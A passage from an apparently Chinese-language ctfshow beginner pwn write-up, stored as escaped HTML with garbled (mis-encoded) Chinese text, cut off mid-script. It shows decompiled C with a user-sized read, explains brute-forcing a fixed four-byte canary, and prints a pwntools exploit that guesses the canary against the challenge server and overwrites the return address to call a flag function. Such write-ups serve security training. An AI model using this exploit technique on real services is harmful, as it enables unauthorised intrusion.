	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/180_hu_a811b94715c574ff.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/180_hu_e77629cc3ef1954.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;ctfshowå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;169&#34;
		data-flex-basis=&#34;405px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è§£é‡Šä¸‹è¿™æ®µå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´å¼€å±€æˆ‘ç»™ç¨‹åºè¾“å…¥ä¸€ä¸ª1000ï¼Œå®ƒå°±åœ¨åç»­ç»™æˆ‘è®¾ç½®1000å®¹é‡å¤§å°çš„ç¼“å†²åŒºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 1. å…ˆé€šè¿‡ printf æç¤ºç”¨æˆ·è¾“å…¥å­—èŠ‚æ•°
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;How many bytes do you want to write to the buffer?&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 2. è¯»å–ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼ˆå¦‚ &amp;#34;1000&amp;#34;ï¼‰å¹¶è½¬æ¢ä¸ºæ•´æ•° nbytes
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1u&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// è¯»å–ç”¨æˆ·è¾“å…¥çš„é•¿åº¦å­—ç¬¦ä¸²ï¼ˆå¦‚ &amp;#34;1000&amp;#34;ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;__isoc99_sscanf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nbytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•° nbytesï¼ˆå¦‚ 1000ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 3. å…³é”®æŒ‡ä»¤ï¼šæŒ‰ç…§ nbytes è¯»å–æ•°æ®åˆ°ç¼“å†²åŒº buf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;$ &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nbytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// è¿™é‡Œçš„ nbytes å°±æ˜¯ç”¨æˆ·è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œå®é™…æ‰§è¡Œè¯»å–æ“ä½œ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;é‚£è¾“å…¥1000ï¼Œç¨‹åºåœ¨åç»­å°±è®©æˆ‘èƒ½è¾“å…¥1000å­—èŠ‚çš„ä¸œè¥¿ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹mainå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/182.png&#34;
	width=&#34;780&#34;
	height=&#34;165&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/182_hu_b3b6890d8e8bb62.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/182_hu_89f1da9771e81f93.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;472&#34;
		data-flex-basis=&#34;1134px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°å…ˆç»è¿‡canaryçš„æ ˆæº¢å‡ºæ£€æŸ¥ï¼Œå¦‚æœå‘ç°æ ˆæº¢å‡ºç«‹åˆ»ç»ˆæ­¢ç¨‹åºè¿›è¡Œï¼Œé‚£å°±å¾—ç»•è¿‡è¿™ä¸ªcanaryä¿æŠ¤äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ‰‹åŠ¨æ”¾ç½®çš„canaryå‡½æ•°ä¸­çš„canary.txtçš„å€¼æ˜¯ä¸å˜çš„ï¼Œå†µä¸”æ˜¯4å­—èŠ‚å¤§å°çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç¼–ä¸€ä¸ªå¾ªç¯å››æ¬¡ï¼Œä»0~255èŒƒå›´æ‰¾å­—èŠ‚çš„åŒé‡å¾ªç¯å°±å¯ä»¥çˆ†ç ´å‡ºcanaryå€¼ï¼Œä»è€Œç»•è¿‡memcmpçš„æ£€æŸ¥ï¼Œå®ç°æ ˆæº¢å‡ºè¿”å›flagå‡½æ•°åœ°å€å»æ‰§è¡Œflagå‡½æ•°è·å¾—flagå­—ç¬¦ä¸²ã€‚&lt;/p&gt;
&lt;p&gt;python2 expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PWN1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28226&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;How many bytes do you want to write to the buffer?&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1000&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PWN1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;$ &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;data:&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Where is the flag?&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;PWN1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;success!!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PWN1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;NO!!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Canary-------------&amp;gt;:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PWN1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28226&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8048696&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PWN1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;How many bytes do you want to write to the buffer?&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
